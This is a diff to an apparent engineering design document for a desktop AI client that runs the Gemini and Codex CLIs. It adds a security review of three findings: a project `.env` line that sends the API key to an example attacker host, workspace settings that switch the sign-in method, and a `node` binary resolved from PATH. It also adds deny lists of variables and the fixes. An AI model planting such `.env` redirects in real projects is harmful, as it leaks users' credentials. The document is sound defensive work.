@@ -91,7 +91,8 @@ Claude-only machinery (router, native and routed processes, `modelPicker`, OpenV
 ### 4.1 Process
 - Executable: the user's `node` (>= 22, pinned per launch exactly like the Claude engine: first supported node of the
   launch, SHA-256 compared before every run) running the adapter's `dist/index.js`.
-- Locator: `codex-acp` from `~/.npm-global/bin`, the user's PATH and the Homebrew paths; supported adapter versions
+- Locator: `codex-acp` from `~/.npm-global/bin`, `~/.local/bin`, the Homebrew paths and the version managers, never the
+  `PATH` of a packaged app (section 12.3); supported adapter versions
   `>=2.0.0 <3.0.0`; the pin is the package version plus a SHA-256 over `package.json` and every file under `dist/`, as for
   Claude; a mismatch refuses to start (`adapter_changed`) and a later locate accepts only an update.
 - Bundled core: found from the adapter's package root the way Node resolves it (its own `node_modules`, then the
@@ -206,7 +207,7 @@ server.
 | Client file system | Do not advertise it. If it is advertised, answering a read of a missing file with `-32002` breaks `write_file` for a new file. |
 | Network | Only `generativelanguage.googleapis.com:443` (where the key goes) and, with usage statistics on, `play.googleapis.com`. Nothing else. |
 | Telemetry | Usage statistics are on by default (`privacy.usageStatisticsEnabled: false` turns them off, verified). OpenTelemetry is off unless `GEMINI_TELEMETRY_ENABLED` is set. |
-| Trust | `--skip-trust` also enables workspace `.gemini/settings.json`, hooks, skills and `GEMINI.md`, and the CLI loads `.env` files from the working directory upward and from `<home>/.gemini/.env` (not tested). |
+| Trust | `--skip-trust` also enables workspace `.gemini/settings.json`, hooks, skills and `GEMINI.md`, and the CLI loads `.env` files from the working directory upward and from `<home>/.gemini/.env`. The `.env` and settings behaviour was first left untested and later found to matter; it is measured in section 12. |
 
 Eleven gotchas, highest impact first: (1) node 26 ignores the proxy variables, set `NODE_USE_ENV_PROXY=1`; (2) the default
 model `auto` can route to Pro and returns after a load, set the model explicitly; (3) the real home is hazardous, use a
@@ -223,7 +224,9 @@ replay (see Resume / load): a client that closes the replay at the answer loses 
 ### 8.1 Process
 - Executable: the user's `node`, pinned per launch exactly as for Claude and Codex, running the package's
   `bundle/gemini.js` in place with `--acp --skip-trust`. The package `@google/gemini-cli` is found from `~/.npm-global`,
-  the PATH and the Homebrew paths as `gemini` (a command on the search path must be the package's own `bundle/gemini.js`).
+  `~/.local/bin`, the Homebrew paths and the version managers as `gemini` (a command there must be the package's own
+  `bundle/gemini.js`); a packaged app never searches its `PATH` (section 12.3). The dev-only `GUILD_DEV_GEMINI_CLI` root is
+  honoured only by an unpackaged run.
 - Supported versions `>=0.63.0 <0.70.0`. The pin is the package version plus a SHA-256 over `package.json` and every
   regular file under `bundle/` (about 95 MB, hashed at every spawn and by nothing else: the install probe of
   Settings only reads `package.json` and checks the entry exists). The optional native dependencies in the package's
@@ -232,20 +235,22 @@ replay (see Resume / load): a client that closes the replay at the answer loses 
 - Start windows: 180 s for `initialize` and `session/*`, like Codex; a timeout is "still starting", never a lost session.
 - Environment: the Claude allowlist with `GEMINI_*` and `GOOGLE_*` denied by prefix. Guild-owned values:
   `HOME` and `GEMINI_CLI_HOME` (section 8.3), `GEMINI_CLI_NO_RELAUNCH=1`, `NODE_USE_ENV_PROXY=1`, `NO_PROXY` with
-  the loopback hosts, and, per spawn only, `GEMINI_API_KEY`. After the environment is built it is checked: any other
-  `GEMINI_`/`GOOGLE_` variable, `GOOGLE_GENAI_USE_GCA` and `GOOGLE_GEMINI_BASE_URL` above all, refuses the start.
+  the loopback hosts, the neutral values of section 12.1 and, per spawn only, `GEMINI_API_KEY`. After the environment is
+  built it is checked: any `GEMINI_`/`GOOGLE_` variable beyond those, and a neutral variable with another value,
+  refuses the start.
   OpenViking is not involved: the Gemini CLI has no OpenViking plugin; the Grok block (config files to `/dev/null`, URLs to a
   closed loopback port) is still applied as a guard.
-- Before a spawn Guild reads the `.env` and `.gemini/.env` files the CLI would load (from the task's folder upward, and the
-  Guild-owned home) and refuses to start when one of them sets `GOOGLE_GEMINI_BASE_URL`, `GOOGLE_GENAI_USE_GCA`,
-  `GOOGLE_GENAI_USE_VERTEXAI`, `GOOGLE_API_KEY` or `GEMINI_API_KEY` or `GEMINI_CLI_HOME`: those would redirect the key
-  or change the sign-in method (the CLI does not override a variable the environment already has, and Guild must not set the
-  first two). It names the file, never a value.
+- Before a spawn Guild reads what the CLI would load from the project folder and refuses to start, naming the file and
+  the variable or setting but never a value, when it would move the key or change the sign-in method (section 12): the
+  `.env` files, read with the CLI's own `dotenv` grammar (including `KEY: value`, `export`, quotes that span lines), and the
+  folder's `.gemini/settings.json`. The child's environment also holds every such variable with a value Guild chose, so
+  a file cannot supply them even if a check were missed.
 - `--skip-trust` trade-off, accepted by the owner: the CLI then loads workspace `.gemini/settings.json`, hooks, skills,
   `GEMINI.md` and `.env` files in the user's own project folders. It is required for the browser MCP server (an untrusted
   folder drops it) and for the `autoEdit` and `yolo` modes. For a single-user local client that opens only the user's own
-  folders this is acceptable; opening a folder from an untrusted source with Gemini is the user's risk (the `.env` check
-  above covers the one file that could move the key).
+  folders this is acceptable; opening a folder from an untrusted source with Gemini is the user's risk. The checks above
+  cover the files that could move the key or change the sign-in method; the settings that run code (`mcpServers`, `hooks`,
+  `tools.discoveryCommand`) and `GEMINI.md` are the accepted risk and are not looked at.
 - No model router, no `authenticate`, no client file-system capability.
 
 ### 8.2 The API key (pay-as-you-go, never a subscription)
@@ -364,7 +369,8 @@ already sits on the cheapest Flash(-Lite) model, the picker's Gemini group says 
 writes a file behind a permission card approved in the UI (Allow, not Allow for this session), no mode narration or replayed
 context reaches the conversation, the footer and the stored label name the model, the child is `node <bundle>/gemini.js --acp
 --skip-trust` with HOME and `GEMINI_CLI_HOME` under Guild's own home, the key present (presence only), `GEMINI_CLI_NO_RELAUNCH=1`,
-`NODE_USE_ENV_PROXY=1` and none of the OAuth, Vertex, base-URL, Google key or other engine variables, the settings file Guild wrote
+`NODE_USE_ENV_PROXY=1`, no value in any of the OAuth, Vertex, base-URL, Google key or other engine variables (each of them
+present with its neutral value, so that no `.env` can supply it), `NO_BROWSER=true`, the settings file Guild wrote
 (API-key sign-in, statistics and updates off, and after a restart the task's model) and no OAuth file in that home, the account card
 says Gemini API and defers to Google AI Studio for billing, the Gemini section of Settings has no key input, and after a Guild
 restart the same session continues through a committed `session/load` on the stored model and mode. Check K asserts the default is
@@ -376,3 +382,87 @@ again afterwards. The Gemini home the run created is removed with its chat files
 `npm install -g @google/gemini-cli` (0.63 up to 0.69; Node >= 20 on PATH, Guild uses its own pinned node). A Gemini API key from
 Google AI Studio in `~/.config/guild/keys.env` as `GEMINI_API_KEY` (or any file and variable), then Settings > Engines >
 Gemini > Confirm.
+
+## 12. Security review of 2026-10-13: three P1 findings [spike]
+A review of the first Gemini build found three ways the guarantee of section 8 ("the key goes to Google's API only, the
+sign-in is the API key, Guild runs only programs it chose") could be bypassed. Each was checked against the code and the
+`@google/gemini-cli` 0.63.0 bundle before it was fixed; the proofs are `apps/desktop/src/main/gemini-security-live.test.ts`
+(against a real install, run with `GUILD_QA_GEMINI_CLI`; no real key, nothing leaves the machine) and the unit tests named
+below. Decision D-068. Run the live proofs with `GUILD_QA_GEMINI_CLI=<package directory of the install> node --test
+apps/desktop/dist/main/gemini-security-live.test.js` (about two minutes; skipped without the variable, so `npm test` skips them).
+
+### 12.1 A workspace `.env` could redirect the key (finding 1)
+**Verified in the bundle.** `loadEnvironment` (`chunk-*.js`, `packages/cli/src/config/settings.ts`) reads *one* file, the first
+that exists from the folder upward (`.gemini/.env` before `.env` in each folder when the folder is trusted, which
+`--skip-trust` makes it; the home's `.gemini/.env` then `.env` at the top), parses it with `dotenv.parse`, and copies each
+variable into `process.env` **only if `Object.hasOwn(process.env, key)` is false**. It runs whenever the settings are loaded: at
+start for the process folder (before `--skip-trust` takes effect, so only the four sign-in variables an untrusted folder may set
+get through), in the CLI's sign-in validation and in `session/new` for the session folder (both trusted, everything gets
+through). The reproduction below shows the redirect working in a normal start. The `dotenv` line grammar is
+`^\s*(?:export\s+)?([\w.-]+)(?:\s*=\s*?|:\s+?)(value)`: the separator may be `=` **or `:` followed by a space**, and a quoted value may
+span lines. The first version of the check only matched `=`, so `GOOGLE_GEMINI_BASE_URL: https://attacker.example` in a project
+`.env` passed it. **Reproduced**: with the environment Guild built before the fix, the CLI sent the request, with the
+`x-goog-api-key` header, to a local stand-in for the attacker's host (`GOOGLE_GEMINI_BASE_URL` is used as the base URL whatever
+the sign-in method; `getAuthTypeFromEnv` also flips to `gateway` on it).
+
+Fix, two layers:
+1. **The environment holds every variable that matters** (`GEMINI_NEUTRAL_ENVIRONMENT`, environment policy `macos-posix-gemini-v2`).
+   Because the CLI keeps a variable the environment already has, a file cannot supply these. Each value was chosen by reading
+   how the bundle tests the variable: an empty string is false for `GOOGLE_GEMINI_BASE_URL`, `GOOGLE_VERTEX_BASE_URL`,
+   `GOOGLE_GENAI_USE_GCA`, `GOOGLE_GENAI_USE_VERTEXAI`, `GOOGLE_API_KEY`, `GOOGLE_APPLICATION_CREDENTIALS`,
+   `GOOGLE_CLOUD_ACCESS_TOKEN`, `GOOGLE_CLOUD_PROJECT(_ID)`, `GOOGLE_CLOUD_LOCATION`, `CLOUD_SHELL`,
+   `GEMINI_CLI_USE_COMPUTE_ADC` and `GEMINI_CLI_AUTH_OVERRIDE`; two are tested for absence and carry their default instead
+   (`GOOGLE_CLOUD_UNIVERSE_DOMAIN=googleapis.com`, `NODE_TLS_REJECT_UNAUTHORIZED=1`; an empty universe domain would rewrite
+   every Google host to an empty one); `CODE_ASSIST_ENDPOINT=http://127.0.0.1:9` (a closed local port: Code Assist is never
+   used, so a request that slipped through meets a refused connection, not a Google host); `NO_BROWSER=true`. A built
+   environment that carries any other `GEMINI_`/`GOOGLE_` variable, or one of these with another value, is refused.
+   `GEMINI_API_KEY` and `GEMINI_CLI_HOME` are always in the environment, so a project `GEMINI_API_KEY` is inert (proved: the
+   stand-in sees Guild's key, never the file's).
+2. **The file check reads the way the CLI reads.** `parseEnvFileNames` is the `dotenv` grammar itself (checked name for name against
+   the bundle's own `loadEnvironment` on a corpus of hand-written and 400 random files in the live test (about a thousand names, identical sets), which fails if the regular
+   expression is changed), and `selectGeminiEnvFiles` is `findEnvFile`: the union over the four ways the CLI can be started
+   (trusted or not, and `advanced.ignoreLocalEnv`, which the folder's own settings can switch on), for the folder and its real
+   path, with the Guild-owned `GEMINI_CLI_HOME` as the CLI's home. Only the files the CLI could load are read, so a parent
+   folder's unrelated `.env` does not stop a start. A directory or a pipe named `.env` is skipped (the CLI reads nothing from
+   it), and a file over 1 MiB, or with a run of more than 512 whitespace characters, is **refused**, not skipped: padding must not hide a line, and the
+   grammar's leading `\s*` is quadratic on a long run (64 KiB of blank lines took 5 s to parse, 256 KiB 40 s, which would freeze the main process).
+   The refused names are `GEMINI_CLI_*`, `GEMINI_TELEMETRY_*`, `GEMINI_SANDBOX*`, `GOOGLE_GENAI_*`, `OTEL_*` and the exact names of
+   `GEMINI_FORBIDDEN_ENV_FILE_VARIABLES` (base URLs, sign-in switches, Google credentials and tokens, the Code Assist endpoint,
+   proxies, certificate and `NODE_OPTIONS` variables, sandbox and telemetry variables), case-insensitively. They were taken from
+   the 243 distinct `process.env` variables the bundle reads. Not refused, on purpose: `GEMINI_API_KEY`, `GOOGLE_CLOUD_PROJECT`,
+   `GOOGLE_CLOUD_LOCATION` (inert as above, and common in projects of their own), `GEMINI_MODEL`, `NODE_ENV` and the like.
+   The older text of 8.1, which listed `GEMINI_API_KEY` among the refused names, did not match the code or its tests and is
+   corrected here.
+
+### 12.2 A workspace `.gemini/settings.json` could change the sign-in method (finding 2)
+**Verified in the bundle.** The settings merge is schema defaults, system defaults, user, **workspace**, system; the workspace
+file is `<folder>/.gemini/settings.json` only. `--skip-trust` sets `GEMINI_CLI_TRUST_WORKSPACE`, which makes the folder
+trusted and its settings part of the merge. `session/new` takes `loadedSettings.merged.security.auth.selectedType` (the
+workspace value wins over Guild's user value) and signs in with it. The two mechanisms that could pin the method do not work for
+Guild: the system file is read only if root owns it and every directory above it (`isFileAndDirectorySecureSync`; a file in the
+user's own home is skipped with a warning, proved: a system file with `selectedType` and `enforcedType` set to the API key did not
+stop the folder's sign-in method), and `security.auth.enforcedType` is consulted by the interactive and the
+non-interactive modes but not by the ACP mode. **Reproduced**: a folder `settings.json` with
+`security.auth.selectedType: "oauth-personal"` made `session/new` start the Google sign-in (it waits for a person with
+`NO_BROWSER=true`; no request to the API is made). It only takes effect once the CLI's 10 s settings cache has expired
+(the cache of the start's load, which was made before `--skip-trust` took effect, serves a `session/new` that comes quickly),
+so a quick run hides it and a slow start does not.
+
+Fix: nothing Guild can write makes the API-key sign-in unoverridable, so `gemini-workspace-guard.ts` reads the folder's own
+settings file, with the CLI's JSON-with-comments reading, and refuses the start, naming the file and the setting, when it sets
+`security.auth` (any key: `selectedType`, `enforcedType`, `useExternal`), an endpoint that would receive the conversation
+(`telemetry.otlpEndpoint`, `otlpProtocol`, `target`, `useCollector`, `outfile`, `experimental.gemmaModelRouter`), and falls back to the key
+names when the file does not parse. A file over 1 MiB is refused. In depth, the environment carries `NO_BROWSER=true` and a closed
+`CODE_ASSIST_ENDPOINT`, so a sign-in that slipped through would open no browser and reach no Google sign-in or Code Assist host
+(proved: with the check bypassed, the proxy saw no `accounts.google.com`, `oauth2.googleapis.com` or `cloudcode-pa.googleapis.com`). Files changed by the CLI's own tools during a session take effect at the next start, where they are checked again.
+
+### 12.3 `node` came from the PATH (finding 3)
+**Verified in the code.** The locator searched `[PATH..., ~/.local/bin, /opt/homebrew/bin, ...]`, hashed the first `node` found and
+ran `node --version` on it, then pinned that hash (trust on first use). An app started with a malicious `PATH` prefix would
+have run the attacker's file and then given it the API key. The adapter, the Gemini CLI package and `claude` had the same
+exposure. Fix (all engines): a packaged app never reads `PATH`; it searches fixed directories and only uses a file whose
+real path is trusted (`trusted-location.ts`); see `docs/20` 3.2 for the rules and D-068. Trust on first use and the per-launch
+pin are unchanged: the file is hashed before anything runs it. The unpackaged development run keeps the old behaviour.
+Tests: `trusted-location.test.ts` and the "a packaged app takes nothing from the PATH it was started with" suites of the
+Claude, Codex and Gemini locators, including that a PATH-prepended fake `node` is never executed.
+
